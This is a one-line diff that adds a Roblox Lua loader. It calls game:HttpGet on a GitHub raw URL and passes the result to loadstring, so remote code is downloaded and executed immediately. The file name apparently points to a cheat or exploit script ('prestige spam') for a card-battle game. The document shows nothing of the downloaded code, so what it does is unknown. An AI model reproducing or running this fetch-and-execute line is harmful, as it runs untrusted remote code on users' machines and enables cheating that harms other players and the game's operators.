@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/upd-2-5-card-battles-prestige-spam3-epfc15vio9wzy1.lua"))()
